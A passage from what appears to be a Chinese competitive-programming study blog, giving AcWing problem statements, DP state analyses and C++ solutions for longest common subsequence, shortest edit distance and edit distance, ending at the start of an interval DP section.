的字符串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>，求既是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 的子序列又是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> 的子序列的字符串长度最长是多少。</p><p><strong>输入格式</strong></p><p>第一行包含两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>。</p><p>第二行包含一个长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 的字符串，表示字符串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span>。</p><p>第三行包含一个长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 的字符串，表示字符串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>。</p><p>字符串均由小写字母构成。</p><p><strong>输出格式</strong></p><p>输出一个整数，表示最大长度。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo separator="true">,</mo><mi>M</mi><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">1 \le N,M \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>4 5acbdabedc</code></pre><p><strong>输出样例：</strong></p><pre><code>3</code></pre><h3 id="DP-2">DP</h3><ul><li>状态表示<code>f[i][j]</code><ul><li>集合：所有在第一个序列的前i个字母出现，且在第二个序列的前j个字母中出现的自序列</li><li>属性：Max(序列的最大长度)</li></ul></li><li>状态计算<ul><li>以a[i],b[j]是否为序列的一员进行分类(00, 01, 10, 11)</li><li>00 对应 <code>f[i -1][j - 1]</code></li><li>01 对应的子序列 包含于<code>f[i - 1, j]</code>对应子序列 包含于 <code>f[i, j]</code>对应子序列<ul><li>这样<code>f[i - 1][j]</code>在求Max的过程中一定会包含01且不会超出<code>f[i][j]</code>对应的Max</li><li>00 对应的情况不需要写出来，因为<code>f[i - 1][j - 1]</code>对应子序列一定包含于<code>f[i  - 1][j]</code>对应的子序列中</li><li>求Max问题可以有重复</li></ul></li><li>10 同理</li><li>11 对应<code>f[i - 1][j - 1] + 1</code></li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">char</span> a[kN], b[kN];</span><br><span class="line"><span class="type">int</span> f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s%s&quot;</span>, a + <span class="number">1</span>, b + <span class="number">1</span>);  <span class="comment">// 字符串不需要取地址符, 从下标为1的位置开始读</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">      f[i][j] = <span class="built_in">max</span>(f[i - <span class="number">1</span>][j], f[i][j - <span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">if</span> (a[i] == b[j]) f[i][j] = <span class="built_in">max</span>(f[i][j], f[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[n][m]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-902-最短编辑距离"><a href="https://www.acwing.com/problem/content/904/">AcWing 902. 最短编辑距离</a></h2><p><code>难度：简单</code></p><p>给定两个字符串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>，现在要将 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 经过若干操作变为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>，可进行的操作有：</p><ol><li>删除–将字符串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 中的某个字符删除。</li><li>插入–在字符串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 的某个位置插入某个字符。</li><li>替换–将字符串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 中的某个字符替换为另一个字符。</li></ol><p>现在请你求出，将 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 变为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> 至少需要进行多少次操作。</p><p><strong>输入格式</strong></p><p>第一行包含整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>，表示字符串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 的长度。</p><p>第二行包含一个长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 的字符串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span>。</p><p>第三行包含整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>，表示字符串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> 的长度。</p><p>第四行包含一个长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 的字符串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>。</p><p>字符串中均只包含大小写字母。</p><p><strong>输出格式</strong></p><p>输出一个整数，表示最少操作次数。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo separator="true">,</mo><mi>m</mi><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">1 \le n, m \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>10 AGTCTGACGC11 AGTAAGTAGGC</code></pre><p><strong>输出样例：</strong></p><pre><code>4</code></pre><h3 id="DP-3">DP</h3><ul><li>状态表示<code>f[i][j]</code><ul><li>集合：所有将<code>a[1~i]</code>变成<code>b[1~j]</code>的操作方式</li><li>属性：Min</li></ul></li><li>状态计算<ul><li>以最后一步进行的操作进行分类</li><li>删除 <code>f[i - 1][j]</code></li><li>插入 <code>f[i][j - 1]</code></li><li>替换 <code>f[i - 1][j - 1] + 0/1</code> 如果<code>a[i] = b[j]</code>则加1</li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">char</span> a[kN], b[kN];</span><br><span class="line"><span class="type">int</span> f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%s&quot;</span>, &amp;n, a + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%s&quot;</span>, &amp;m, b + <span class="number">1</span>);</span><br><span class="line">  <span class="comment">// 初始化</span></span><br><span class="line">  <span class="comment">// f[0][i]如果a初始长度就是0，那么只能用插入操作让它变成b</span></span><br><span class="line">  <span class="comment">// f[i][0]同样地，如果b的长度是0，那么a只能用删除操作让它变成b</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">    f[<span class="number">0</span>][i] = i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    f[i][<span class="number">0</span>] = i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">      f[i][j] = <span class="built_in">min</span>(f[i - <span class="number">1</span>][j] + <span class="number">1</span>, f[i][j - <span class="number">1</span>] + <span class="number">1</span>);  <span class="comment">// 删除 添加</span></span><br><span class="line">      f[i][j] = <span class="built_in">min</span>(f[i][j], f[i - <span class="number">1</span>][j - <span class="number">1</span>] + (a[i] != b[j]));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[n][m]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-899-编辑距离"><a href="https://www.acwing.com/problem/content/901/">AcWing 899. 编辑距离</a></h2><p><code>难度：简单</code></p><p>给定 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个长度不超过 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn></mrow><annotation encoding="application/x-tex">10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span></span></span></span> 的字符串以及 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 次询问，每次询问给出一个字符串和一个操作次数上限。</p><p>对于每次询问，请你求出给定的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个字符串中有多少个字符串可以在上限操作次数内经过操作变成询问给出的字符串。</p><p>每个对字符串进行的单个字符的插入、删除或替换算作一次操作。</p><p><strong>输入格式</strong></p><p>第一行包含两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 行，每行包含一个字符串，表示给定的字符串。</p><p>再接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 行，每行包含一个字符串和一个整数，表示一次询问。</p><p>字符串中只包含小写字母，且长度均不超过 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn></mrow><annotation encoding="application/x-tex">10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span></span></span></span>。</p><p><strong>输出格式</strong></p><p>输出共 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 行，每行输出一个整数作为结果，表示一次询问中满足条件的字符串个数。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo separator="true">,</mo><mi>m</mi><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">1 \le n, m \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span>,</p><p><strong>输入样例：</strong></p><pre><code>3 2abcacdbcdab 1acbd 2</code></pre><p><strong>输出样例：</strong></p><pre><code>13</code></pre><h3 id="DP-4">DP</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1010</span>, kM = <span class="number">15</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">char</span> str[kN][kM];</span><br><span class="line"><span class="type">int</span> f[kM][kM];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">EditDist</span><span class="params">(<span class="type">char</span> a[], <span class="type">char</span> b[])</span> </span>&#123;  <span class="comment">// 传的就是指针</span></span><br><span class="line">  <span class="comment">// 一定要从a + 1开始读长度(从a开始读长度读出来是0: 读到\00为止)</span></span><br><span class="line">  <span class="type">int</span> len_a = <span class="built_in">strlen</span>(a + <span class="number">1</span>), len_b = <span class="built_in">strlen</span>(b + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= len_b; i++) &#123;</span><br><span class="line">    f[<span class="number">0</span>][i] = i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= len_a; i++) &#123;</span><br><span class="line">    f[i][<span class="number">0</span>] = i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= len_a; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= len_b; j++) &#123;</span><br><span class="line">      f[i][j] = <span class="built_in">min</span>(f[i - <span class="number">1</span>][j] + <span class="number">1</span>, f[i][j - <span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">      f[i][j] = <span class="built_in">min</span>(f[i][j], f[i - <span class="number">1</span>][j - <span class="number">1</span>] + (a[i] != b[j]));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> f[len_a][len_b];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, str[i] + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">char</span> str_query[kM];</span><br><span class="line">  <span class="type">int</span> limit;</span><br><span class="line">  <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s%d&quot;</span>, str_query + <span class="number">1</span>, &amp;limit);</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">EditDist</span>(str[i], str_query) &lt;= limit) &#123;</span><br><span class="line">        count++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, count);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="区间DP">区间DP</h1><h2 id="AcWing-282-石子合并">AcWing 282. 石子合并</h2><p><code>难度：简单</code></p><p>设有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation 